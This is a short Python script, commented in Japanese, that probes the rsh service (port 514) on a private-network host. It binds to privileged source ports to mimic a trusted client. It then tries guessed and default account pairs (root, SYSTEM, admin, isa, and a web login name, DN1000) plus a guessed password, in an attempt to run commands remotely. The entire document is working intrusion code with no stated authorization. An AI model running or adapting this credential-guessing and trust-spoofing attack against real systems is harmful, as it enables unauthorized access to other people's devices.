# -*- coding: utf-8 -*-
"""rsh 接続を特権源ポート/異なるユーザで試す"""
import socket, time

HOST = "192.168.1.150"

def try_rsh(local_user="root", remote_user="root", cmd="HELP", src_port=None, stderr="0"):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    if src_port:
        try:
            s.bind(("0.0.0.0", src_port))
        except Exception as e:
            print(f"  [bind {src_port} fail: {e}]")
    try:
        s.connect((HOST, 514))
    except Exception as e:
        print(f"  [connect fail: {e}]")
        return
    # シーケンス: stderr-port\0 local-user\0 remote-user\0 cmd\0
    payload = (stderr + "\0" + local_user + "\0" + remote_user + "\0" + cmd + "\0").encode()
    try:
        s.sendall(payload)
    except Exception as e:
        print(f"  [send fail: {e}]")
        s.close(); return
    resp = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            resp += c
            if len(resp) > 8192: break
    except socket.timeout:
        pass
    except Exception as e:
        print(f"  [recv err: {e}]")
    s.close()
    try: peek = resp.decode("shift_jis","replace")
    except: peek = repr(resp[:80])
    print(f"  local={local_user!r} remote={remote_user!r} port={src_port} -> {len(resp)}B: {peek[:200]!r}")
    return resp

# いろんな組合せで試す
print("[a] 特権ポート1023 + root/root")
try_rsh("root","root","HELP", src_port=1023)

print("[b] 特権ポート513 + root/root")
try_rsh("root","root","HELP", src_port=513)

print("[c] 特権ポート1023 + DN1000/DN1000 (webログイン名)")
try_rsh("DN1000","DN1000","HELP", src_port=1023)

print("[d] 特権ポート1023 + isa/isa")
try_rsh("isa","isa","HELP", src_port=1023)

print("[e] 特権なし(any) + root/root")
try_rsh("root","root","HELP", src_port=None)

print("[f] 特権1023 + SYSTEM/SYSTEM")
try_rsh("SYSTEM","SYSTEM","HELP", src_port=1023)

print("[g] 特権1023 + admin/admin")
try_rsh("admin","admin","HELP", src_port=1023)

print("[h] 特権1023 + HELP -p DN1000 (パスワード指定)")
try_rsh("root","root","HELP -p DN1000", src_port=1023)
